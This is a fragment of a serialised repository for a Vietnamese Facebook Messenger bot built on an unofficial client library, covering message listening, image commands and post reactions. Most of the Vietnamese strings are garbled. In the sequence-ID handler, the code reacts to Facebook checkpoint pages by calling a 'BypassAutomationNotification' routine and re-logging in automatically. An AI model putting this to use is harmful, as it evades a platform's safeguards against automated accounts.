(delta.deltaMessageReply.replyToMessageId) {\n            return defaultFuncs\n              .post('https://www.facebook.com/api/graphqlbatch/', ctx.jar, {\n                av: ctx.globalOptions.pageID,\n                queries: JSON.stringify({\n                  o0: {\n                    doc_id: '2848441488556444',\n                    query_params: {\n                      thread_and_message_id: {\n                        thread_id: callbackToReturn.threadID,\n                        message_id: delta.deltaMessageReply.replyToMessageId.id,\n                      },\n                    },\n                  },\n                }),\n              })\n              .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n              .then((resData) => {\n                if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n                if (resData[resData.length - 1].successful_results === 0) throw {\n                  error: 'forcedFetch: there was no successful_results',\n                  res: resData\n                };\n                const fetchData = resData[0].o0.data.message;\n                const mobj = {};\n\n                for (const n in fetchData.message.ranges) {\n                  mobj[fetchData.message.ranges[n].entity.id] = (fetchData.message.text || '').substr(fetchData.message.ranges[n].offset, fetchData.message.ranges[n].length);\n                }\n                callbackToReturn.messageReply = {\n                  type: 'Message',\n                  threadID: callbackToReturn.threadID,\n                  messageID: fetchData.message_id,\n                  senderID: fetchData.message_sender.id.toString(),\n                  attachments: fetchData.message.blob_attachment.map((att) => utils._formatAttachment({\n                    blob_attachment: att\n                  })),\n                  args: (fetchData.message.text || '').trim().split(/\\s+/) || [],\n                  body: fetchData.message.text || '',\n                  isGroup: callbackToReturn.isGroup,\n                  mentions: mobj,\n                  timestamp: parseInt(fetchData.timestamp_precise),\n                };\n              })\n\n              .catch((err) => log.error('forcedFetch', err))\n              .finally(() => {\n                if (ctx.globalOptions.autoMarkDelivery) {\n                  markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n                }\n\n                if (!ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID) return;\n                globalCallback(null, callbackToReturn);\n              });\n          } else {\n            callbackToReturn.delta = delta;\n          }\n          if (ctx.globalOptions.autoMarkDelivery) {\n            markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n          }\n\n          if (!ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID) return;\n          globalCallback(null, callbackToReturn);\n        }\n      }\n\n      return;\n    }\n  }\n  switch (delta.class) {\n    case 'ReadReceipt': {\n      let fmtMsg;\n      try {\n        fmtMsg = utils.formatDeltaReadReceipt(delta);\n      } catch (err) {\n        return log.error('L·ªói Nh·∫π', err);\n      }\n      globalCallback(null, fmtMsg);\n      break;\n    }\n    case 'AdminTextMessage': {\n      switch (delta.type) {\n        case 'joinable_group_link_mode_change':\n        case 'magic_words':\n        case 'pin_messages_v2':\n        case 'change_thread_theme':\n        case 'change_thread_icon':\n        case 'change_thread_nickname':\n        case 'change_thread_admins':\n        case 'change_thread_approval_mode':\n        case 'group_poll':\n        case 'messenger_call_log':\n        case 'participant_joined_group_call': {\n          let fmtMsg;\n          try {\n            fmtMsg = utils.formatDeltaEvent(delta);\n          } catch (err) {\n            console.log(delta);\n            return log.error('L·ªói Nh·∫π', err);\n          }\n          globalCallback(null, fmtMsg);\n          break;\n        }\n      }\n      break;\n    }\n\n    //For group images\n    case 'ForcedFetch': {\n      if (!delta.threadKey) return;\n      const mid = delta.messageId;\n      const tid = delta.threadKey.threadFbId;\n\n      if (mid && tid) {\n        const form = {\n          av: ctx.globalOptions.pageID,\n          queries: JSON.stringify({\n            o0: {\n              doc_id: '2848441488556444',\n              query_params: {\n                thread_and_message_id: {\n                  thread_id: tid.toString(),\n                  message_id: mid,\n                },\n              },\n            },\n          }),\n        };\n        defaultFuncs\n          .post('https://www.facebook.com/api/graphqlbatch/', ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then((resData) => {\n            if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n            if (resData[resData.length - 1].successful_results === 0) throw {\n              error: 'forcedFetch: there was no successful_results',\n              res: resData\n            };\n\n            const fetchData = resData[0].o0.data.message;\n\n            if (utils.getType(fetchData) === 'Object') {\n              log.info('forcedFetch', fetchData);\n              switch (fetchData.__typename) {\n                case 'ThreadImageMessage':\n                  if (!ctx.globalOptions.selfListen && fetchData.message_sender.id.toString() === ctx.userID) return;\n                  if (!ctx.loggedIn) return;\n\n                  globalCallback(null, {\n                    type: 'change_thread_image',\n                    threadID: utils.formatID(tid.toString()),\n                    snippet: fetchData.snippet,\n                    timestamp: fetchData.timestamp_precise,\n                    author: fetchData.message_sender.id,\n                    image: {\n                      attachmentID: fetchData.image_with_metadata && fetchData.image_with_metadata.legacy_attachment_id,\n                      width: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.x,\n                      height: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.y,\n                      url: fetchData.image_with_metadata && fetchData.image_with_metadata.preview.uri,\n                    },\n                  });\n                  break;\n                case 'UserMessage': {\n                  const event = {\n                    type: 'message',\n                    senderID: utils.formatID(fetchData.message_sender.id),\n                    body: fetchData.message.text || '',\n                    threadID: utils.formatID(tid.toString()),\n                    messageID: fetchData.message_id,\n                    attachments: [{\n                      type: 'share',\n                      ID: fetchData.extensible_attachment.legacy_attachment_id,\n                      url: fetchData.extensible_attachment.story_attachment.url,\n                      title: fetchData.extensible_attachment.story_attachment.title_with_entities.text,\n                      description: fetchData.extensible_attachment.story_attachment.description.text,\n                      source: fetchData.extensible_attachment.story_attachment.source,\n                      image: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).uri,\n                      width: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).width,\n                      height: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).height,\n                      playable: (fetchData.extensible_attachment.story_attachment.media || {}).is_playable || false,\n                      duration: (fetchData.extensible_attachment.story_attachment.media || {}).playable_duration_in_ms || 0,\n                      subattachments: fetchData.extensible_attachment.subattachments,\n                      properties: fetchData.extensible_attachment.story_attachment.properties,\n                      }],\n                    mentions: {},\n                    timestamp: parseInt(fetchData.timestamp_precise),\n                    isGroup: (fetchData.message_sender.id !== tid.toString()),\n                  };\n\n                  log.info('ff-Return', event);\n                  globalCallback(null, event);\n                  break;\n                }\n                default:\n                  log.error('forcedFetch', fetchData);\n              }\n            } else {\n              log.error('forcedFetch', fetchData);\n            }\n          })\n          .catch((err) => log.error('forcedFetch', err));\n      }\n      break;\n    }\n    case 'ThreadName':\n    case 'ParticipantsAddedToGroupThread':\n    case 'ParticipantLeftGroupThread': {\n      let formattedEvent;\n      try {\n        formattedEvent = utils.formatDeltaEvent(delta);\n      } catch (err) {\n        console.log(err);\n        return log.error('L·ªói Nh·∫π', err);\n      }\n\n      if (!ctx.globalOptions.selfListen && formattedEvent.author.toString() === ctx.userID) return;\n      if (!ctx.loggedIn) return;\n      globalCallback(null, formattedEvent);\n      break;\n    }\n    case 'NewMessage': {\n      const hasLiveLocation = delta => {\n        const attachment = delta.attachments?.[0]?.mercury?.extensible_attachment;\n        const storyAttachment = attachment?.story_attachment;\n        return storyAttachment?.style_list?.includes('message_live_location');\n      };\n      \n      if (delta.attachments?.length === 1 && hasLiveLocation(delta)) {\n        delta.class = 'UserLocation';\n        \n        try {\n          const fmtMsg = utils.formatDeltaEvent(delta);\n          globalCallback(null, fmtMsg);\n        } catch (err) {\n          console.log(delta);\n          log.error('L·ªói Nh·∫π', err);\n        }\n      }\n      break;\n    }\n  }\n}\n\nfunction markDelivery(ctx, api, threadID, messageID) {\n  if (threadID && messageID) {\n    api.markAsDelivered(threadID, messageID, (err) => {\n      if (err) log.error('markAsDelivered', err);\n      else {\n        if (ctx.globalOptions.autoMarkRead) {\n          api.markAsRead(threadID, (err) => {\n            if (err) log.error('markAsDelivered', err);\n          });\n        }\n      }\n    });\n  }\n}\n\n\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  var globalCallback = identity;\n  var okeoke;\n  getSeqID = function getSeqID() {\n    ctx.t_mqttCalled = false;\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(res => {\n        okeoke = res;\n        return res;\n      })\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then((resData) => {\n        if (utils.getType(resData) != \"Array\") {\n          if (okeoke.request.uri && okeoke.request.uri.href.includes(\"https://www.facebook.com/checkpoint/\")) {\n            if (okeoke.request.uri.href.includes('601051028565049')) {\n                return global.Fca.BypassAutomationNotification(undefined, ctx.jar, ctx.globalOptions, undefined ,process.env.UID)\n            }\n          }\n          if (global.Fca.Require.FastConfig.AutoLogin) {\n            return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n              return global.Fca.Action('AutoLogin');\n            });\n          } else if (!global.Fca.Require.FastConfig.AutoLogin) {\n            return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n          }\n          return;\n        } else {\n          if (resData && resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n          if (resData[resData.length - 1].successful_results === 0) throw {\n            error: \"getSeqId: there was no successful_results\",\n            res: resData\n          };\n          if (resData[0].o0.data.viewer.message_threads.sync_sequence_id) {\n            ctx.lastSeqId = resData[0].o0.data.viewer.message_threads.sync_sequence_id;\n            listenMqtt(defaultFuncs, api, ctx, globalCallback);\n          } else throw {\n            error: \"getSeqId: no sync_sequence_id found.\",\n            res: resData\n          };\n        }\n      })\n      .catch((err) => {\n        log.error(\"getSeqId\", err);\n        if (okeoke.request.uri && okeoke.request.uri.href.includes(\"https://www.facebook.com/checkpoint/\")) {\n              if (okeoke.request.uri.href.includes('601051028565049')) {\n                  return global.Fca.BypassAutomationNotification(undefined, ctx.jar, ctx.globalOptions, undefined ,process.env.UID)\n              }\n          }\n        if (utils.getType(err) == \"Object\" && err.error === global.Fca.Require.Language.Index.ErrAppState) ctx.loggedIn = false;\n        return globalCallback(err);\n      });\n  };\n\n  return function(callback) {\n    class MessageEmitter extends EventEmitter {\n      stopListening(callback) {\n        callback = callback || (() => {});\n        globalCallback = identity;\n        if (ctx.mqttClient) {\n          ctx.mqttClient.unsubscribe(\"/webrtc\");\n          ctx.mqttClient.unsubscribe(\"/rtc_multi\");\n          ctx.mqttClient.unsubscribe(\"/onevc\");\n          ctx.mqttClient.publish(\"/browser_close\", \"{}\");\n          ctx.mqttClient.end(false, function(...data) {\n            ctx.mqttClient = undefined;\n          });\n        }\n        global.Fca.Data.StopListening = true;\n      }\n    }\n\n    var msgEmitter = new MessageEmitter();\n    globalCallback = (callback || function(error, message) {\n      if (error) return msgEmitter.emit(\"error\", error);\n      msgEmitter.emit(\"message\", message);\n    });\n\n    //Reset some stuff\n    if (!ctx.firstListen) ctx.lastSeqId = null;\n    ctx.syncToken = undefined;\n    ctx.t_mqttCalled = false;\n\n    //Same request as getThreadList\n    form = {\n      av: ctx.globalOptions.pageID,\n      queries: JSON.stringify({\n        o0: {\n          doc_id: '3336396659757871',\n          query_params: {\n            limit: 1,\n            before: null,\n            tags: ['INBOX'],\n            includeDeliveryReceipts: false,\n            includeSeqID: true,\n          },\n        },\n      }),\n    };\n\n\n    if (!ctx.firstListen || !ctx.lastSeqId) getSeqID();\n    else listenMqtt(defaultFuncs, api, ctx, globalCallback);\n    ctx.firstListen = false;\n\n    return msgEmitter;\n  };\n};","path":null,"size_bytes":35091,"size_tokens":null},"lib/fca-auto/src/addExternalModule.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function addExternalModule(moduleObj) {\n    if (utils.getType(moduleObj) == \"Object\") {\n      for (let apiName in moduleObj) {\n        if (utils.getType(moduleObj[apiName]) == \"Function\") api[apiName] = moduleObj[apiName](defaultFuncs, api, ctx);\n        else throw new Error(`Item \"${apiName}\" in moduleObj must be a function, not ${utils.getType(moduleObj[apiName])}!`);\n\n      }\n    }\n    else throw new Error(`moduleObj must be an object, not ${utils.getType(moduleObj)}!`);\n  };\n};\n","path":null,"size_bytes":600,"size_tokens":null},"modules/commands/ayaka.js":{"content":"module.exports.config = {\n  name: \"ayaka\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Teri\",\n  description: \"Random ·∫£nh ayaka\",\n  commandCategory: \"Random-img\",\n  usages: \"ayaka\",\n  cooldowns: 20,\n  dependencies: {\n    \"request\":\"\",\n    \"fs-extra\":\"\",\n    \"axios\":\"\"\n  }\n    \n};\n\nmodule.exports.run = async({api,event,args,Users,Threads,Currencies}) => {\nconst axios = global.nodemodule[\"axios\"];\nconst request = global.nodemodule[\"request\"];\nconst fs = global.nodemodule[\"fs-extra\"];\n  var link = [\n  \"https://i.imgur.com/uXWLBeC.jpeg\",\n    \"https://i.imgur.com/7Dc9GrN.jpeg\",\n    \"https://i.imgur.com/IaAVMFK.jpeg\",\n    \"https://i.imgur.com/WceNH2z.jpeg\",\n    \"https://i.imgur.com/1XosaEA.jpeg\",\n    \"https://i.imgur.com/M58fVe6.jpeg\",\n    \"https://i.imgur.com/czaXZ3a.jpeg\",\n    \"https://i.imgur.com/xsu6v2I.jpeg\",\n    \"https://i.imgur.com/f17dCCM.jpeg\",\n    \"https://i.imgur.com/opquSuU.jpeg\",\n    \"https://i.imgur.com/U87kL1B.jpeg\",\n    \"https://i.imgur.com/Osa1EEd.jpeg\",\n    \"https://i.imgur.com/38XTSUn.jpeg\",\n    \"https://i.imgur.com/B7mAsZB.jpeg\",\n    \"https://i.imgur.com/2APmfRs.jpeg\",\n    \"https://i.imgur.com/mCUOJ8U.jpeg\",\n    \"https://i.imgur.com/CnN1DxG.jpeg\",\n    \"https://i.imgur.com/onlEme6.jpeg\",\n    \"https://i.imgur.com/OF73muW.jpeg\",\n    \"https://i.imgur.com/UO1sK8I.jpeg\",\n    \"https://i.imgur.com/AlkGMJr.jpeg\",\n    \"https://i.imgur.com/yZy8yvG.jpeg\",\n    \"https://i.imgur.com/wLuwsWH.jpeg\",\n    \"https://i.imgur.com/NoLgneL.jpeg\",\n    \"https://i.imgur.com/wnXPqVv.jpeg\",\n    \"https://i.imgur.com/D4ORkkM.jpeg\",\n    \"https://i.imgur.com/bXZCoXT.jpeg\",\n    \"https://i.imgur.com/ixx7Psr.jpeg\",\n    \"https://i.imgur.com/TWP438b.jpeg\",\n    \"https://i.imgur.com/zEiGsZE.jpeg\",\n    \"https://i.imgur.com/pFbFkvj.jpeg\",\n    \"https://i.imgur.com/U9fPLgz.jpeg\",\n    \"https://i.imgur.com/VjOIoAg.jpeg\",\n    \"https://i.imgur.com/gmYkkFF.jpeg\",\n    \"https://i.imgur.com/4o5MRal.jpeg\",\n    \"https://i.imgur.com/XDGkXfZ.jpeg\",\n    \"https://i.imgur.com/B50Pi6m.jpeg\",\n    \"https://i.imgur.com/BZKVLfn.jpeg\",\n    \"https://i.imgur.com/wSQv7mM.jpeg\",\n    \"https://i.imgur.com/2Ky8mww.jpeg\",\n    \"https://i.imgur.com/4fhxxts.jpeg\",\n    \"https://i.imgur.com/rvFm33m.jpeg\",\n    \"https://i.imgur.com/J2EG5QV.jpeg\",\n    \"https://i.imgur.com/JwkXNeQ.jpeg\",\n    \"https://i.imgur.com/S9AGlH6.jpeg\",\n    \"https://i.imgur.com/L9Jg1pg.jpeg\",\n    \"https://i.imgur.com/urJBEyk.jpeg\",\n    \"https://i.imgur.com/Hpw0D8O.jpeg\",\n    \"https://i.imgur.com/i5hdv5w.jpeg\",\n    \"https://i.imgur.com/O2uymjw.jpeg\",\n           \"https://i.imgur.com/GiSKHaT.jpeg\",\n           \"https://i.imgur.com/dAs2g30.jpeg\",\n           \"https://i.imgur.com/RIhBJhH.jpeg\",\n           \"https://i.imgur.com/pvSpSEb.jpeg\",\n           \"https://i.imgur.com/XUJdz0T.jpeg\",\n           \"https://i.imgur.com/jad2M8w.jpeg\",\n           \"https://i.imgur.com/vbOsMtC.jpeg\",\n           \"https://i.imgur.com/ZTtxhm8.jpeg\",\n           \"https://i.imgur.com/8Qf8hLj.jpeg\",\n           \"https://i.imgur.com/FXGMlHp.jpeg\",\n           \"https://i.imgur.com/jWDw41w.jpeg\",\n           \"https://i.imgur.com/LgvUCju.jpeg\",\n           \"https://i.imgur.com/sdBRGt3.jpeg\",\n           \"https://i.imgur.com/I32E7mo.jpeg\",\n           \"https://i.imgur.com/OBbsiOY.jpeg\",\n           \"https://i.imgur.com/ZlwE7gK.jpeg\",\n           \"https://i.imgur.com/RjTJEia.jpeg\",\n           \"https://i.imgur.com/mihSwWi.jpeg\",\n           \"https://i.imgur.com/XLLJjEM.jpeg\",\n           \"https://i.imgur.com/NkMNc9U.jpeg\",\n           \"https://i.imgur.com/DscSpW9.jpeg\",\n           \"https://i.imgur.com/jA1JB8Z.jpeg\",\n           \"https://i.imgur.com/4744YOK.jpeg\",\n           \"https://i.imgur.com/L7ZmAdP.jpeg\",\n           \"https://i.imgur.com/fnqGUzZ.jpeg\",\n           \"https://i.imgur.com/4r5vG6y.jpeg\",\n           \"https://i.imgur.com/mOZyIBN.jpeg\",\n           \"https://i.imgur.com/5nKPTdH.jpeg\",\n           \"https://i.imgur.com/2DoiyZg.jpeg\",\n           \"https://i.imgur.com/BDvYK5e.jpeg\",\n           \"https://i.imgur.com/JImr4HA.jpeg\",\n           \"https://i.imgur.com/SDYcTdB.jpeg\",\n           \"https://i.imgur.com/GH3rmiF.jpeg\",\n           \"https://i.imgur.com/tUjsJk6.jpeg\",\n           \"https://i.imgur.com/jvjWcZ9.jpeg\",\n           \"https://i.imgur.com/9l5tHki.jpeg\",\n           \"https://i.imgur.com/P4GYTjs.jpeg\",\n           \"https://i.imgur.com/4qXII5h.jpeg\",\n           \"https://i.imgur.com/wix18FM.jpeg\",\n           \"https://i.imgur.com/h6JyuUd.jpeg\",\n           \"https://i.imgur.com/agZEIfN.jpeg\",\n           \"https://i.imgur.com/qQJmQ7X.jpeg\",\n           \"https://i.imgur.com/SJ7tHsd.jpeg\",\n           \"https://i.imgur.com/IWsuHJN.jpeg\",\n           \"https://i.imgur.com/PshaE6A.jpeg\",\n           \"https://i.imgur.com/OvAjaUQ.jpeg\",\n           \"https://i.imgur.com/CW4Id3o.jpeg\",\n           \"https://i.imgur.com/5SWTCJ4.jpeg\",\n  ];\n  var max = Math.floor(Math.random() * 6);  \nvar min = Math.floor(Math.random() * 2);\n  var data = await Currencies.getData(event.senderID);\n  var exp =  data.exp;\n  var money = data.money\n      if(money < 0) api.sendMessage(\"B·∫°n c·∫ßn 100 ƒë√¥ ƒë·ªÉ xem ·∫£nh ?\",event.threadID,event.messageID)\n          else {\n   Currencies.setData(event.senderID, options = {money: money - 0})\n   var callback = () => api.sendMessage({body:`ùóîÃâùóªùóµ ùóîùòÜùóÆùó∏ùóÆ ùó°ùó≤ÃÄ üíû ${link.length}\\n-100 ƒë√¥ !`,attachment: fs.createReadStream(__dirname + \"/cache/1.jpg\")}, event.threadID, () => fs.unlinkSync(__dirname + \"/cache/1.jpg\"), event.messageID); \n      return request(encodeURI(link[Math.floor(Math.random() * link.length)] + (max - min))).pipe(fs.createWriteStream(__dirname+\"/cache/1.jpg\")).on(\"close\",() => callback());\n     }\n   };\n ","path":null,"size_bytes":5616,"size_tokens":null},"modules/commands/umaru.js":{"content":"module.exports.config = {\n  name: \"umaru\",\n  version: \"2.0.0\",\n  hasPermssion: 1,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 20\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/umaru.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'Umaruuuuu',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1598,"size_tokens":null},"index.js":{"content":"const { spawn } = require(\"child_process\");\nconst { readFileSync } = require(\"fs-extra\");\nconst http = require(\"http\");\nconst axios = require(\"axios\");\nconst semver = require(\"semver\");\nconst logger = require(\"./utils/log\");\nconst express = require('express');\nconst path = require('path');\nconst chalk = require('chalkercli');\nconst chalk1 = require('chalk');\nconst CFonts = require('cfonts');\nconst app = express();\nconst port = process.env.PORT || 2006;\nconst moment = require(\"moment-timezone\");\nvar gio = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss || D/MM/YYYY\");\nvar thu = moment.tz('Asia/Ho_Chi_Minh').format('dddd');\nif (thu == 'Sunday') thu = 'ùêÇùê°ùêÆÃâ ùêçùê°ùêöÃ£ÃÇùê≠'\nif (thu == 'Monday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêáùêöùê¢'\nif (thu == 'Tuesday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêÅùêö'\nif (thu == 'Wednesday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêìùêÆÃõ'\nif (thu == \"Thursday\") thu = 'ùêìùê°ùêÆÃõÃÅ ùêçùêöÃÜùê¶'\nif (thu == 'Friday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêíùêöÃÅùêÆ'\nif (thu == 'Saturday') thu = 'ùêìùê°ùêÆÃõÃÅ ùêÅùêöÃâùê≤'\n\n\n\n\nconsole.log('„Ö§„Ö§„Ö§„Ö§            ùêáùê®ÃÇùê¶ ùêßùêöùê≤ ùê•ùêöÃÄ:' +  thu,'ùêÇùê°ùêÆÃÅùêú ùêõùêöÃ£ùêß ùêúùê®ÃÅ ùê¶ùê®Ã£ÃÇùê≠ ùêßùê†ùêöÃÄùê≤ ùêØùêÆùê¢ ùêØùêûÃâ\\n' )\n\n\n\napp.get('/', function(req, res) {\n\n    res.sendFile(path.join(__dirname, '/index.html'));\n\n});\n\n\napp.listen(port);\nconsole.log('ùêåùêöÃÅùê≤ ùêúùê°ùêÆÃâ ùêõùêöÃÜÃÅùê≠ ùêùùêöÃÇÃÄùêÆ ùê≠ùêöÃ£ùê¢ http://localhost:' + port,\"ùêØùêöÃÄùê® ùê•ùêÆÃÅùêú:\" + gio,\"\\n\\n\");\n\n\nlogger(\"ùêãùê¢ùêûÃÇùêß ùê°ùêûÃ£ÃÇ ùêÖùêöùêúùêûùêõùê®ùê®ùê§: https://www.facebook.com/cyannohope\", \"ùêÖùêöùêúùêûùêõùê®ùê®ùê§\");\n\n\nconst rainbow = chalk.rainbow(`\\n„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Ö§„Äé=== Cyan  ===„Äè\\n\\n`).stop();\nrainbow.render();\nconst frame = rainbow.frame(); \nconsole.log(frame);\nlogger(\"ùïêùï†ùï¶ùï£ ùïßùïñùï£ùï§ùïöùï†ùïü ùïöùï§ ùï•ùïôùïñ ùïùùïíùï•ùïñùï§ùï•!\", \"UPDATE\");\n\n\nfunction startBot(message) {\n    (message) ? logger(message, \"BOT ƒêANG KH·ªûI ƒê·ªòNG\") : \"\";\n\n    const child = spawn(\"node\", [\"--trace-warnings\", \"--async-stack-traces\", \"main.js\"], {\n        cwd: __dirname,\n        stdio: \"inherit\",\n        shell: true\n    });\n\n   child.on(\"close\",async (codeExit) => {\n      var x = 'codeExit'.replace('codeExit',codeExit);\n        if (codeExit == 1) return startBot(\"BOT RESTARTING!!!\");\n         else if (x.indexOf(2) == 0) {\n           await new Promise(resolve => setTimeout(resolve, parseInt(x.replace(2,'')) * 1000));\n                 startBot(\"Bot has been activated please wait a moment!!!\");\n       }\n         else return; \n    });\n\n    child.on(\"error\", function (error) {\n        logger(\"An error occurred: \" + JSON.stringify(error), \"[ Starting ]\");\n    });\n};\naxios.get(\"https://raw.githubusercontent.com/tandung1/Bot12/main/package.json\").then((res) => {\n    //logger(res['data']['name'], \"[ T√äN PR0JECT ]\");\n    //logger(\"Version: \" + res['data']['version'], \"[ PHI√äN B·∫¢N ]\");\n    //logger(res['data']['description'], \"[ L∆ØU √ù ]\");\n})\nsetTimeout(async function () {\n//CFonts.say('Maris v3', {\n    //font: 'block',\n      //align: 'center',\n  //gradient: ['red', 'magenta']\n    //})\n//CFonts.say(`Bot Messenger Created By Cyan`, {\n    //font: 'console',\n    //align: 'center',\n    //gradient: ['red', 'magenta']\n    //})\n  //CFonts.say('Vtuan\\n', {\n    //font: 'block',\n      //align: 'center',\n  //gradient: ['red', 'magenta']\n    //})\n\nrainbow.render(); \n\nconst frame = rainbow.frame(); \nconsole.log(frame);\n\n  logger('ùêÅùêöÃÜÃÅùê≠ ùêùùêöÃÇÃÄùêÆ ùê•ùê®ùêöùêù ùê¨ùê®ùêÆùê´ùêúùêû ùêúùê®ùêùùêû', 'LOAD')\n  startBot()\n}, 70)","path":null,"size_bytes":3702,"size_tokens":null},"modules/commands/randommem.js":{"content":"module.exports.config = {\n  name: \"randommem\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"D-Jukie\",\n  description: \"Ch·ªçn ng·∫´u nhi√™n s·ªë th√†nh vi√™n trong box\",\n  commandCategory: \"Nh√≥m\",\n  cooldowns: 0\n};\nmodule.exports.run = async ({ api, event, args, Users }) => {\n  const { threadID, messageID, participantIDs, isGroup } = event;\n  const num = parseInt(args[0]) || 1;\n  if(isGroup == false) return api.sendMessage('‚Üí ùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùê≠ùê°ùêÆÃõÃ£ùêú ùê°ùê¢ùêûÃ£ÃÇùêß ùê•ùêûÃ£ÃÇùêßùê° ùêßùêöÃÄùê≤ ùê®ÃõÃâ ùêßùê°ùê®ÃÅùê¶!', threadID, messageID);\n  const random = participantIDs.sort(function() {\n        return .5 - Math.random();\n    });\n    const members = [];\n    for( let i = 0; i <= num - 1; i++) {\n      var name = (await Users.getData(random[i])).name;\n      members.push(name)\n    }\n  return api.sendMessage(`‚Üí Ng∆∞·ªùi ƒë∆∞·ª£c ch·ªçn l√†: ${members.join(' ')}`, threadID, messageID);\n}\n","path":null,"size_bytes":953,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/setPostReaction.js":{"content":"/**\n * @fix by NTKhang\n * update as Thursday, 10 February 2022\n * do not remove the author name to get more updates\n */\n\n \"use strict\";\n\n var utils = require(\"../utils\");\n var log = require(\"npmlog\");\n \n function formatData(resData) {\n   return {\n     viewer_feedback_reaction_info: resData.feedback_react.feedback.viewer_feedback_reaction_info,\n     supported_reactions: resData.feedback_react.feedback.supported_reactions,\n     top_reactions: resData.feedback_react.feedback.top_reactions.edges,\n     reaction_count: resData.feedback_react.feedback.reaction_count\n   };\n }\n \n module.exports = function(defaultFuncs, api, ctx) {\n   return function setPostReaction(postID, type, callback) {\n     var resolveFunc = function(){};\n     var rejectFunc = function(){};\n     var returnPromise = new Promise(function (resolve, reject) {\n       resolveFunc = resolve;\n       rejectFunc = reject;\n     });\n \n     if (!callback) {\n       if (utils.getType(type) === \"Function\" || utils.getType(type) === \"AsyncFunction\") {\n         callback = type;\n         type = 0;\n       }\n       else {\n         callback = function (err, data) {\n           if (err) {\n             return rejectFunc(err);\n           }\n           resolveFunc(data);\n         };\n       }\n     }\n \n     var map = {\n       unlike: 0,\n       like: 1,\n       heart: 2,\n       love: 16,\n       haha: 4,\n       wow: 3,\n       sad: 7,\n       angry: 8\n     };\n     \n     if (utils.getType(type) !== \"Number\" && utils.getType(type) === \"String\") {\n       type = map[type.toLowerCase()];\n     }\n     else {\n       throw {\n         error: \"setPostReaction: Invalid reaction type\"\n       };\n     }\n     \n     var form = {\n       av: ctx.userID,\n       fb_api_caller_class: \"RelayModern\",\n       fb_api_req_friendly_name: \"CometUFIFeedbackReactMutation\",\n       doc_id: \"4769042373179384\",\n       variables: JSON.stringify({\n         input: {\n           actor_id: ctx.userID,\n           feedback_id: (new Buffer.from(\"feedback:\" + postID)).toString(\"base64\"),\n           feedback_reaction: type,\n           feedback_source: \"OBJECT\",\n           is_tracking_encrypted: true,\n           tracking: [],\n           session_id: \"f7dd50dd-db6e-4598-8cd9-561d5002b423\",\n           client_mutation_id: Math.round(Math.random() * 19).toString()\n         },\n         useDefaultActor: false,\n         scale: 3\n       })\n     };\n \n     defaultFuncs\n       .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n       .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n       .then(function(resData) {\n         if (resData.errors) {\n           throw resData;\n         }\n         return callback(null, formatData(resData.data));\n       })\n       .catch(function(err) {\n         log.error(\"setPostReaction\", err);\n         return callback(err);\n       });\n \n     return returnPromise;\n   };\n };","path":null,"size_bytes":2832,"size_tokens":null},"includes/handle/handleCreateDatabase.js":{"content":"module.exports = function ({ Users, Threads, Currencies }) {\n    const logger =require(\"../../utils/log.js\");\n    return async function ({ event 